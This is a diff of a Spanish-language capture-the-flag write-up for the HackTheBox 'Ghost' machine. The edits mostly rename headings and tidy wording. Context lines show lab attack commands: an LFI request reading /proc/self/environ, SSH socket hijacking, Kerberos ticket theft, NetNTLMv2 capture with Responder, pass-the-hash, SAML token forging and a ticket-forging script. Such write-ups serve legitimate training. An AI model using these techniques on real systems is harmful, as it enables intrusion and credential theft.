@@ -591,7 +591,7 @@ Se nos dice que se encuentra una API expuesta bajo el subdominio `intranet.ghost
 Además se nos menciona que la corporación está planeando implementar una nueva funcionalidad en el blog. Una conexión con la intranet, como está en desarrollo se usa una clave API como variable de entorno definida en la máquina con el nombre `DEV_INTRANET_KEY`
 
 
-## Ghost CMS Content API
+### Ghost CMS Content API
 
 En Ghost CMS existe una api de contenido destinada a la consulta de la información que se publica dentro de este CMS. Sin embargo, la autorización a este recurso se gestiona mediante una clave de API, podemos usar la `API key` para enviar una solicitud HTTP y así consultar información, la ruta está en `/ghost/api/content`
 
@@ -635,10 +635,10 @@ curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/authors/?key=a5af62882895
   }
 }
 ~~~
+<br>
 
 
-
-# Explotación
+# Intrusión / Explotación
 ---
 ## Local File Inclusion - Abusing Custom File Ghost CMS API
 
@@ -652,7 +652,7 @@ El parámetro `extra` hace referencia a la lectura de un archivo cuando consulta
 curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/posts?key=a5af628828958c976a3b6cc81a&extra={LFI_TEST}'
 ~~~
 
-Usaremos este parámetro para incluir archivos locales de la máquina, en este caso más que ver los usuarios del sistema (metodología típica), me interesa ver las variables de entorno definidas en el sistema, ya que en el archivo `README` se nos menciona que existe una variable de entorno `DEV_INTRANET_KEY`. Para explotar el LFI usaremos el siguiente comando
+Usaremos este parámetro para incluir archivos locales de la máquina, en este caso más que ver los usuarios del sistema (metodología típica), podría interesarnos ver las variables de entorno definidas en el sistema, ya que en el archivo `README` se nos menciona que existe una variable de entorno `DEV_INTRANET_KEY`
 
 ~~~ bash
 curl -sLX GET 'http://ghost.htb:8008/ghost/api/content/posts?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/self/environ' | jq
@@ -711,6 +711,8 @@ Gracias a esta línea de código podemos deducir lo siguiente:
 Aprovecharemos la información que acabamos de descubrir para obtener acceso a la API. Si inspeccionamos el archivo `scan.rs`, veremos lo siguiente
 
 ![image-center](/assets/images/posts/ghost-command-injection-2.png){: .align-center}
+
+### Exploiting
 
 En este archivo se define un `endpoint` llamado `/scan`, el cual recibe un `JSON`, el cual debemos enviar un atributo `url`
 
@@ -823,7 +825,9 @@ srw------- 1 root root 0 Feb 20 10:04 florence.ramirez@ghost.htb@dev-workstation
 - `ControlPath`: Ruta del socket utilizado para compartir conexiones
 - `ControlPersist yes`: Mantiene el socket abierto aunque las conexiones no estén activas
 
-Dentro del directorio `controlmaster` se almacenarían estas conexiones activas hacia un host, estas se definen en un socket con la sintaxis `usuario@host:puerto`. En este caso existe un socket hacia `ghost.htb@dev-workstation` por el puerto `22` como el usuario `florence.ramirez `
+Dentro del directorio `controlmaster` se almacenarían estas conexiones activas hacia un host, estas se definen en un socket con la sintaxis `usuario@host:puerto`. 
+
+En este caso existe un socket hacia `ghost.htb@dev-workstation` por el puerto `22` como el usuario `florence.ramirez `
 
 Sabiendo como funciona este concepto, podremos conectarnos sin proporcionar credenciales con el siguiente comando
 
@@ -840,8 +844,6 @@ florence.ramirez@LINUX-DEV-WS01:~$ hostname -I
 172.18.0.2
 ~~~
 
-- **Resumen**: Explotamos una vulnerabilidad en `172.17.0.3` y ahora pivotamos a `172.17.0.2`
-
 Si examinamos el archivo `/etc/hosts` podremos notar que la IP `10.0.0.254` ya hace referencia al Domain Controller
 
 ~~~ bash
@@ -857,7 +859,7 @@ ff02::2	ip6-allrouters
 ~~~
 
 
-## Stealing Kerberos TGT
+## Stealing Kerberos Ticket Granting Ticket
 
 Dado que estamos en un dominio de Active Directory, revisaremos si tenemos tickets `kerberos` almacenados en esta máquina con el comando `klist`
 
@@ -980,7 +982,7 @@ bitbucket.ghost.htb.	180	IN	A	10.10.14.128
 Vemos que el registro `bitbucket.ghost.htb` apunta a nuestra dirección IP, que en este caso es la `10.10.14.128`
 
 
-## Stealing Hash NTLMv2
+## Stealing NetNTLMv2 Hashes
 
 Como tenemos un registro `DNS` bajo nuestra dirección IP, desplegaremos `responder` para intentar obtener hashes `NetNTLMv2` que podamos crackear de forma offline y así poder autenticarnos más adelante
 
@@ -1008,7 +1010,7 @@ tcpdump -i tun0 'port 80' -vvv
 ~~~
 
 
-## Cracking Hash NetNTLMv2
+## Hash Cracking
 
 Intentaremos romper el hash `NetNTLMv2` para ver la contraseña del usuario `justin.bradley`
 
@@ -1038,7 +1040,7 @@ JUSTIN.BRADLEY::ghost:14292cfb834bca9e:fcab0b7e3022f799db75e76dcfd44608:01010000
 ~~~
 
 
-## WinRM 
+## Shell as `justin.bradley` 
 
 Para validar si este usuario es miembro del grupo `Remote Management Users`, usaremos la herramienta `nxc`
 
@@ -1089,7 +1091,7 @@ adfs_gmsa$:aes128-cts-hmac-sha1-96:9633bff...
 La herramienta nos entregará el equivalente en un hash NT para la cuenta `adfs_gmsa$`
 
 
-## PassTheHash
+## Shell as `adfs_gmsa` - PassTheHash
 
 Verificaremos que el usuario `adfs_gmsa$` sea parte del grupo `Remote Management Users`, de esta forma podremos acceder con una consola de `Powershell`
 
@@ -1230,7 +1232,6 @@ cat TKSKey.txt | base64 -d > TKSKey.bin
 
 cat DKMKey.txt | tr -d '-' | xxd -r -p > DKMKey.bin
 ~~~
-
 
 ### Crafting SAML Token
 
@@ -1694,9 +1695,9 @@ Supplemental Credentials:
 Solicitaremos un `TGT` para autenticarnos como `Administrator` y así poder extraer los hashes `NT` de todas las cuentas del dominio
 
 Probaremos ejecutar estos cuatro comandos sin el usuario `root` primeramente, (con `root` me dió algunos problemas)
-{. notice--warning}
+{: .notice--warning}
 
-Como es común en ataques a `kerberos`, debemos sincronizar el reloj con el Controlador de Dominio porque `kerberos` es un poco especialito y usa el `timestamp` para validar los tickets y así evitar otros ataques, si no ejecutamos el siguiente comando veremos el siguiente error
+Como es común en ataques a `kerberos`, debemos sincronizar el reloj con el Controlador de Dominio porque `kerberos` usa el `timestamp` para validar los tickets y así evitar otros ataques, si no ejecutamos el siguiente comando veremos el siguiente error
 
 - `KRB_AP_ERR_SKEW (Clock Skew too great)`
 
@@ -1749,7 +1750,7 @@ En caso que debamos automatizar el ataque porque nos da pereza, podemos definir 
 #!/bin/bash
 
 domain="ghost.htb"
-aes_key="dumpeala_tu"
+aes_key="b0eb..."
 domain_sid="S-1-5-21-2034262909-2733679486-179904498"
 target_user_sid="S-1-5-21-4084500788-938703357-3654145966-519"
 domain_full="corp.ghost.htb"
